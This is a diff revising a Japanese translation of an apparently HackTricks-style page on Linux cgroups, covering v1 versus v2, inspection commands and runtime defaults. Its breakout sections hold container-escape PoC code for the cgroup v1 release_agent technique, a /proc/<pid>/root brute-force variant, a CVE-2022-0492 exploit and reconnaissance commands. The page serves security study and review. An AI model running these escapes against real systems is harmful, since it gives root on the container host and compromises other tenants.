@@ -2,77 +2,77 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## 概要
+## Overview
 
-Linux **control groups** は、プロセスを会計、制限、優先順位付け、ポリシー適用のためにまとめるためのカーネルの仕組みです。namespaces が主にリソースの見え方を分離することに関するなら、cgroups は一群のプロセスがそれらのリソースをどの程度消費できるか（**how much**）や、場合によってはどの種類のリソースとやり取りできるか（**which classes of resources**）を管理する役割を果たします。Containers はユーザが直接意識しなくても常に cgroups に依存しています。ほとんどの modern runtime はカーネルに対して「これらのプロセスはこのワークロードに属し、これらのリソースルールが適用される」と伝える方法を必要とするからです。
+Linux **control groups** は、プロセスを会計、制限、優先度付け、ポリシー適用のためにまとめるためのカーネルの仕組みです。namespaces が主にリソースの見え方を分離することに関するなら、cgroups は主に一群のプロセスがそのリソースをどれだけ消費できるか（**どれだけ**）や、場合によってはどのクラスのリソースとやり取りできるか（**どのクラスのリソース**）を管理します。Containers は常に cgroups に依存します。ユーザが直接それらを見ない場合でも、ほとんどすべてのモダンな runtime はカーネルに「これらのプロセスはこのワークロードに属しており、これが適用されるリソースのルールです」と伝える手段を必要とするからです。
 
-だからこそ container engines は新しいコンテナを独自の cgroup subtree に配置します。一度プロセスツリーがそこに入ると、runtime はメモリ上限の設定、PIDs の制限、CPU 使用の重み付け、I/O の調整、デバイスアクセスの制限などが行えます。本番環境では、これはマルチテナントの安全性と運用上の健全性の両方に不可欠です。意味のあるリソース制御を持たないコンテナは、メモリを使い果たしたり、プロセスでシステムを氾濫させたり、ホストや隣接するワークロードを不安定にするように CPU や I/O を独占する可能性があります。
+このため、container engines は新しい container をそれ自身の cgroup サブツリーに配置します。process tree がそこに置かれると、runtime は memory を上限設定したり、PIDs の数を制限したり、CPU 使用量に重み付けしたり、I/O を制御したり、デバイスアクセスを制限したりできます。本番環境では、これはマルチテナントの安全性と運用上の基本的衛生の両方に不可欠です。意味のあるリソース制御がない container は、memory を枯渇させたり、プロセスでシステムを氾濫させたり、CPU や I/O を独占してホストや隣接する workloads を不安定にする可能性があります。
 
-セキュリティの観点では、cgroups は二つの面で重要です。第一に、リソース制限が不十分または欠如していると、単純な denial-of-service 攻撃を許してしまいます。第二に、特に古い **cgroup v1** 環境では、コンテナ内から書き込み可能な場合に強力な breakout primitives を生む cgroup 機能が歴史的に存在しました。
+セキュリティの観点から、cgroups は2つの点で重要です。第一に、リソース制限が不適切または欠如していると、単純なサービス拒否攻撃が可能になります。第二に、いくつかの cgroup 機能は、特に古い **cgroup v1** のセットアップで、コンテナ内部から書き込み可能だった場合に強力なブレイクアウト用プリミティブを生み出すことが歴史的にありました。
 
 ## v1 Vs v2
 
-実運用では二つの主要な cgroup モデルが存在します。**cgroup v1** は複数のコントローラ階層を露出し、古い exploit writeups はそこで利用可能な奇妙で時に強力なセマンティクスを中心に語られることが多いです。**cgroup v2** はより統一された階層と概してクリーンな振る舞いを導入します。Modern distributions は cgroup v2 を好む傾向が強まっていますが、混在やレガシー環境は依然として存在するため、実際のシステムをレビューする際には両方のモデルが関連します。
+実際には主に 2 つの cgroup モデルがあります。**cgroup v1** は複数のコントローラ階層を露出しており、古い exploit の解説はしばしばそこで利用可能な奇妙で時には過度に強力なセマンティクスを中心に展開します。**cgroup v2** はより統一された階層と一般によりクリーンな挙動を導入します。現代のディストリビューションは cgroup v2 をますます好みますが、混在またはレガシーな環境は依然存在するため、両モデルは実際のシステムをレビューする際に依然として関連性があります。
 
-この差は重要です。なぜなら、cgroup v1 における **`release_agent`** の悪用のような有名な container breakout の話の多くは、非常に特定の古い cgroup の挙動に結びついているからです。ブログで cgroup のエクスプロイトを見て、それを盲目的に現代の cgroup v2-only なシステムに適用すると、ターゲットで実際に何が可能かを誤解する可能性が高いです。
+この違いが重要なのは、cgroup v1 における **`release_agent`** の悪用のような有名な container ブレイクアウト事例のいくつかが、非常に具体的に古い cgroup の挙動に結びついているからです。ブログで cgroup の exploit を見て、それを盲目的に最新の cgroup v2 のみのシステムに適用すると、ターゲットで実際に可能なことを誤解する可能性が高いです。
 
-## 検査
+## Inspection
 
-現在のシェルがどこにあるかを確認する最速の方法は:
+現在のシェルがどの cgroup に属しているかを素早く確認する方法は次のとおりです:
 ```bash
 cat /proc/self/cgroup
 findmnt -T /sys/fs/cgroup
 ```
-`/proc/self/cgroup` ファイルは、現在のプロセスに関連付けられた cgroup パスを表示します。モダンな cgroup v2 ホストでは、通常は統一されたエントリが表示されます。古いまたはハイブリッドなホストでは、複数の v1 コントローラパスが表示されることがあります。パスが分かったら、対応するファイルを `/sys/fs/cgroup` の下で確認して、制限や現在の使用状況を確認できます。
+`/proc/self/cgroup` ファイルは、現在のプロセスに関連付けられた cgroup パスを示します。モダンな cgroup v2 ホストでは、しばしば統一されたエントリが表示されます。古いまたはハイブリッドなホストでは、複数の v1 コントローラのパスが表示されることがあります。パスが分かったら、対応するファイルを `/sys/fs/cgroup` 以下で確認して、制限や現在の使用状況を調べられます。
 
-cgroup v2 ホストでは、次のコマンドが有用です:
+cgroup v2 ホストでは、次のコマンドが役立ちます:
 ```bash
 ls -l /sys/fs/cgroup
 cat /sys/fs/cgroup/cgroup.controllers
 cat /sys/fs/cgroup/cgroup.subtree_control
 ```
-これらのファイルは、どのコントローラが存在し、どのコントローラが子 cgroups に委譲されているかを明らかにします。この委譲モデルは rootless や systemd-managed 環境で重要です。なぜなら、ランタイムが親階層が実際に委譲している cgroup 機能のサブセットしか制御できない場合があるからです。
+これらのファイルは、どのコントローラが存在し、どのコントローラが子 cgroups に委譲されているかを示します。この委譲モデルは、rootless や systemd-managed 環境で重要です。そうした環境では、ランタイムが親階層が実際に委譲する cgroup 機能のサブセットしか制御できないことがあります。
 
 ## Lab
 
-cgroups を実際に観察する一つの方法は、メモリ制限付きのコンテナを実行することです：
+実際に cgroups を観察する一つの方法は、メモリ制限付きコンテナを実行することです:
 ```bash
 docker run --rm -it --memory=256m debian:stable-slim bash
 cat /proc/self/cgroup
 cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
 ```
-PID 制限付きコンテナも試せます:
+PID-limited container を試してみることもできます：
 ```bash
 docker run --rm -it --pids-limit=64 debian:stable-slim bash
 cat /sys/fs/cgroup/pids.max 2>/dev/null
 ```
 These examples are useful because they help connect the runtime flag to the kernel file interface. The runtime is not enforcing the rule by magic; it is writing the relevant cgroup settings and then letting the kernel enforce them against the process tree.
 
-## Runtime Usage
+## ランタイムの使用
 
-Docker、Podman、containerd、CRI-O はいずれも通常の動作の一部として cgroups に依存しています。違いは通常、cgroups を使うかどうかではなく、**どのデフォルトを採用するか**、**systemd とどのように連携するか**、**rootless delegation がどのように機能するか**、および **構成のどの程度がエンジン側で制御され、どの程度がオーケストレーション側で制御されるか** に関するものです。
+Docker, Podman, containerd, and CRI-O all rely on cgroups as part of normal operation. 違いは通常、cgroups を使うかどうかではなく、**どのデフォルトを選ぶか**、**systemd とどのように連携するか**、**rootless delegation がどのように動作するか**、および **設定のどれだけがエンジンレベルで制御され、どれだけがオーケストレーションレベルで制御されるか** に関するものです。
 
-Kubernetes では、resource requests と limits は最終的にノード上の cgroup 設定になります。Pod YAML からカーネルによる強制に至る経路は kubelet、CRI runtime、OCI runtime を経由しますが、最終的にルールを適用するのはやはりカーネルの cgroups メカニズムです。Incus/LXC 環境でも cgroups は多用されます。特に system containers はより豊かなプロセスツリーや VM に近い運用期待値を露出することが多いためです。
+In Kubernetes, resource requests and limits eventually become cgroup configuration on the node. Pod YAML からカーネルによる強制までの経路は kubelet、CRI runtime、そして OCI runtime を経由しますが、最終的にルールを適用するのは cgroups というカーネルの仕組みです。Incus/LXC 環境でも cgroups は多用されます。特に system containers はより豊富なプロセスツリーや VM に近い運用期待を露出することが多いためです。
 
-## Misconfigurations And Breakouts
+## 誤設定と脱出
 
-The classic cgroup security story is the writable **cgroup v1 `release_agent`** mechanism. In that model, if an attacker could write to the right cgroup files, enable `notify_on_release`, and control the path stored in `release_agent`, the kernel could end up executing an attacker-chosen path in the initial namespaces on the host when the cgroup became empty. That is why older writeups place so much attention on cgroup controller writability, mount options, and namespace/capability conditions.
+古典的な cgroup セキュリティの話は、書き込み可能な **cgroup v1 `release_agent`** メカニズムです。そのモデルでは、攻撃者が適切な cgroup ファイルに書き込み、`notify_on_release` を有効にし、`release_agent` に格納されたパスを制御できれば、cgroup が空になったときにカーネルがホストの初期名前空間で攻撃者の選んだパスを実行してしまう可能性があります。だからこそ、古い解析では cgroup コントローラの書き込み可能性、マウントオプション、名前空間／ケーパビリティ条件に大きな注意が払われています。
 
-Even when `release_agent` is not available, cgroup mistakes still matter. Overly broad device access can make host devices reachable from the container. Missing memory and PID limits can turn a simple code execution into a host DoS. Weak cgroup delegation in rootless scenarios can also mislead defenders into assuming a restriction exists when the runtime was never actually able to apply it.
+`release_agent` が利用できない場合でも、cgroup の誤設定は依然として重要です。過度に広いデバイスアクセスはコンテナからホストデバイスへの到達を可能にします。メモリや PID の制限が欠如していると、単純なコード実行がホスト DoS に転じることがあります。rootless シナリオでの弱い cgroup デリゲーションは、ランタイムが実際には適用できていなかった制限が存在すると守備側を誤解させることもあります。
 
-### `release_agent` Background
+### `release_agent` の背景
 
-The `release_agent` technique only applies to **cgroup v1**. The basic idea is that when the last process in a cgroup exits and `notify_on_release=1` is set, the kernel executes the program whose path is stored in `release_agent`. That execution happens in the **initial namespaces on the host**, which is what turns a writable `release_agent` into a container escape primitive.
+`release_agent` テクニックは **cgroup v1** のみに適用されます。基本的な考え方は、ある cgroup 内の最後のプロセスが終了し `notify_on_release=1` が設定されていると、カーネルが `release_agent` に格納されたパスのプログラムを実行する、というものです。その実行は **ホスト上の初期名前空間** で行われるため、書き込み可能な `release_agent` がコンテナ脱出の原始的手段になり得ます。
 
-For the technique to work, the attacker generally needs:
+このテクニックを成功させるために、攻撃者は通常以下を必要とします:
 
 - 書き込み可能な **cgroup v1** 階層
-- 子 cgroup を作成または使用する能力
+- 子 cgroup を作成または利用する能力
 - `notify_on_release` を設定する能力
 - `release_agent` にパスを書き込む能力
-- ホストの視点で実行可能ファイルに解決されるパス
+- ホスト側から見て実行ファイルに解決されるパス
 
-### Classic PoC
+### 古典的 PoC
 
 The historical one-liner PoC is:
 ```bash
@@ -91,11 +91,11 @@ sh -c "echo 0 > $d/w/cgroup.procs"
 sleep 1
 cat /o
 ```
-この PoC はペイロードのパスを `release_agent` に書き込み、cgroup のリリースをトリガーし、その後ホスト上で生成された出力ファイルを読み戻します。
+This PoC writes a payload path into `release_agent`, triggers cgroup release, and then reads back the output file generated on the host.
 
-### 分かりやすい手順
+### 読みやすい手順解説
 
-同じアイデアをステップに分けると理解しやすくなります。
+同じ考え方をステップに分けると理解しやすくなります。
 
 1. 書き込み可能な cgroup を作成して準備する:
 ```bash
@@ -104,12 +104,12 @@ mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
 mkdir /tmp/cgrp/x
 echo 1 > /tmp/cgrp/x/notify_on_release
 ```
-2. コンテナのファイルシステムに対応するホスト側のパスを特定する:
+2. コンテナのファイルシステムに対応するホスト上のパスを特定する:
 ```bash
 host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 ```
-3. ホストのパスから見える payload をドロップする:
+3. ホストのパスから見える payload を配置する:
 ```bash
 cat <<'EOF' > /cmd
 #!/bin/sh
@@ -123,11 +123,11 @@ sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
 sleep 1
 cat /output
 ```
-その結果、payload はホスト側でホストの root 権限で実行される。実際の exploit では、payload は通常 proof file を書き込み、reverse shell を生成するか、ホストの状態を変更する。
+The effect is host-side execution of the payload with host root privileges. In a real exploit, the payload usually writes a proof file, spawns a reverse shell, or modifies host state.
 
-### `/proc/<pid>/root` を使った Relative Path Variant
+### `/proc/<pid>/root` を使った相対パス変種
 
-一部の環境では、container filesystem へのホスト側パスが明確でなかったり、storage driver によって隠されていることがある。その場合、payload のパスは `/proc/<pid>/root/...` を通じて表現できる。ここで `<pid>` は現在のコンテナ内のプロセスに対応するホストの PID である。これが relative-path brute-force variant の基礎である:
+一部の環境では、ホスト側から見た container filesystem へのパスが明確でない、あるいは storage driver によって隠されていることがあります。その場合、payload のパスは `/proc/<pid>/root/...` を介して表現できます。ここで `<pid>` は現在の container 内のプロセスに対応するホストの PID です。これが relative-path brute-force 変種の基礎になります:
 ```bash
 #!/bin/sh
 
@@ -175,11 +175,11 @@ done
 sleep 1
 cat ${OUTPUT_PATH}
 ```
-ここでの重要なトリックはブルートフォース自体ではなくパスの形式です: `/proc/<pid>/root/...` によって、直接のホストのストレージパスが事前に分かっていなくても、カーネルはホスト名前空間からコンテナのファイルシステム内のファイルを解決できます。
+ここで重要なのはブルートフォース自体ではなくパスの形式です: `/proc/<pid>/root/...` により、カーネルは直接のホストストレージパスが事前に分からなくても、ホスト名前空間からコンテナのファイルシステム内のファイルを解決できます。
 
 ### CVE-2022-0492 バリアント
 
-In 2022, CVE-2022-0492 showed that writing to `release_agent` in cgroup v1 was not correctly checking for `CAP_SYS_ADMIN` in the **initial** user namespace. This made the technique far more reachable on vulnerable kernels because a container process that could mount a cgroup hierarchy could write `release_agent` without already being privileged in the host user namespace.
+2022年に、CVE-2022-0492 は cgroup v1 における `release_agent` への書き込みがユーザー名前空間の**初期**で `CAP_SYS_ADMIN` のチェックを正しく行っていないことを示しました。これにより、cgroup 階層をマウントできるコンテナプロセスは、ホストのユーザー名前空間で既に特権を持っていなくても `release_agent` に書き込めるようになり、脆弱なカーネル上でこの手法がはるかに到達可能になりました。
 
 Minimal exploit:
 ```bash
@@ -195,50 +195,51 @@ while true; do sleep 1; done
 ```
 脆弱なカーネルでは、ホストは `/proc/self/exe` をホストの root 権限で実行します。
 
-実際の悪用では、まず環境が書き込み可能な cgroup-v1 パスや危険なデバイスへのアクセスをまだ公開しているか確認してください:
+実際に悪用する場合は、環境がまだ書き込み可能な cgroup-v1 パスや危険なデバイスアクセスを露出していないかをまず確認してください：
 ```bash
 mount | grep cgroup
 find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
 find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
 ls -l /dev | head -n 50
 ```
-もし `release_agent` が存在し、書き込み可能であれば、あなたは既に legacy-breakout の領域にいます:
+もし`release_agent`が存在し、書き込み可能であれば、あなたはすでに legacy-breakout の領域にいます:
 ```bash
 find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
 find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
 ```
-もし cgroup パス自体が escape をもたらさない場合、次に実用的に使われるのはしばしば denial of service や reconnaissance です:
+cgroup path 自体で escape が得られない場合、次に実用的に使われるのはしばしば denial of service や reconnaissance です:
 ```bash
 cat /sys/fs/cgroup/pids.max 2>/dev/null
 cat /sys/fs/cgroup/memory.max 2>/dev/null
 cat /sys/fs/cgroup/cpu.max 2>/dev/null
 ```
-これらのコマンドは、ワークロードが fork-bomb を仕掛ける余地があるか、メモリを大量に消費できるか、あるいは書き込み可能なレガシー cgroup インターフェースを悪用できるかを素早く判別します。
+これらのコマンドは、ワークロードが fork-bomb を仕掛ける余地があるか、メモリを過度に消費できるか、または書き込み可能な旧式の cgroup インターフェイスを悪用できるかを素早く教えてくれます。
 
 ## Checks
 
-ターゲットをレビューする際、cgroup チェックの目的は、どの cgroup モデルが使われているか、コンテナが書き込み可能なコントローラーのパスを参照できるか、そして `release_agent` のような古い breakout primitives がそもそも関連するかどうかを把握することです。
+ターゲットをレビューする際、cgroup チェックの目的は、どの cgroup model が使われているか、コンテナが書き込み可能な controller paths を見ているか、そして古い breakout primitives（例えば `release_agent`）がそもそも関連性があるかを把握することです。
 ```bash
 cat /proc/self/cgroup                                      # Current process cgroup placement
 mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
 find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
 cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
 ```
-何が興味深いか:
+ここで注目すべき点：
 
-- If `mount | grep cgroup` shows **cgroup v1**, older breakout writeups become more relevant.
-- If `release_agent` exists and is reachable, that is immediately worth deeper investigation.
-- If the visible cgroup hierarchy is writable and the container also has strong capabilities, the environment deserves much closer review.
+- `mount | grep cgroup` が **cgroup v1** を示す場合、古い breakout writeups がより関連性を持ちます。
+- `release_agent` が存在し、アクセス可能であれば、直ちに詳細な調査に値します。
+- 見えている cgroup 階層が書き込み可能で、かつコンテナが強い capabilities を持っている場合、その環境はさらに精査に値します。
 
-If you discover **cgroup v1**, writable controller mounts, and a container that also has strong capabilities or weak seccomp/AppArmor protection, that combination deserves careful attention. cgroups are often treated as a boring resource-management topic, but historically they have been part of some of the most instructive container escape chains precisely because the boundary between "resource control" and "host influence" was not always as clean as people assumed.
+もし **cgroup v1**、書き込み可能な controller マウント、そしてコンテナが強い capabilities を持つか seccomp/AppArmor 保護が弱い、という組み合わせを発見したら、注意深い注目が必要です。cgroups はしばしば退屈なリソース管理の話題として扱われますが、歴史的に見て「リソース制御」と「ホストへの影響」の境界が常に想定どおりに明確でなかったため、最も示唆に富む container escape chains の一部になってきました。
 
 ## ランタイムのデフォルト
 
-| Runtime / platform | Default state | Default behavior | Common manual weakening |
+| Runtime / platform | デフォルトの状態 | デフォルトの動作 | よくある手動での弱体化 |
 | --- | --- | --- | --- |
-| Docker Engine | デフォルトで有効 | コンテナは自動的に cgroups に配置されます；リソース制限はフラグで設定しない限り任意です | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
-| Podman | デフォルトで有効 | `--cgroups=enabled` がデフォルトです；cgroup namespace のデフォルトは cgroup のバージョンによって異なります（`private` on cgroup v2, `host` on some cgroup v1 setups） | `--cgroups=disabled`, `--cgroupns=host`, デバイスアクセスの緩和、`--privileged` |
-| Kubernetes | ランタイム経由でデフォルトで有効 | Pods とコンテナはノードのランタイムによって cgroups に配置されます；細かなリソース制御は `resources.requests` / `resources.limits` に依存します | resource requests/limits の省略、privileged デバイスアクセス、ホストレベルのランタイム誤設定 |
-| containerd / CRI-O | デフォルトで有効 | cgroups は通常のライフサイクル管理の一部です | direct runtime configs that relax device controls or expose legacy writable cgroup v1 interfaces |
+| Docker Engine | デフォルトで有効 | コンテナは自動的に cgroups に配置されます。リソース制限はフラグで指定しない限りオプションです | `--memory`、`--pids-limit`、`--cpus`、`--blkio-weight` を省略すること；`--device`；`--privileged` |
+| Podman | デフォルトで有効 | `--cgroups=enabled` がデフォルトです。cgroup namespace のデフォルトは cgroup のバージョンによって異なります（cgroup v2 では `private`、一部の cgroup v1 セットアップでは `host`） | `--cgroups=disabled`、`--cgroupns=host`、デバイスアクセスの緩和、`--privileged` |
+| Kubernetes | ランタイム経由でデフォルトで有効 | Pods とコンテナはノードランタイムによって cgroups に配置されます。細かなリソース制御は `resources.requests` / `resources.limits` に依存します | resource requests/limits を省略すること、特権付きデバイスアクセス、ホストレベルのランタイムの誤設定 |
+| containerd / CRI-O | デフォルトで有効 | cgroups は通常のライフサイクル管理の一部です | デバイス制御を緩めるランタイム設定や、レガシーで書き込み可能な cgroup v1 インターフェースを公開する設定 |
 
-重要な区別は、**cgroup の存在**は通常デフォルトである一方、**有用なリソース制約**は明示的に設定されない限り多くの場合オプションである、という点です。
+重要な区別は、**cgroup の存在** は通常デフォルトである一方、**有用なリソース制約** は明示的に設定されない限り多くの場合オプションである、という点です。
+{{#include ../../../../banners/hacktricks-training.md}}
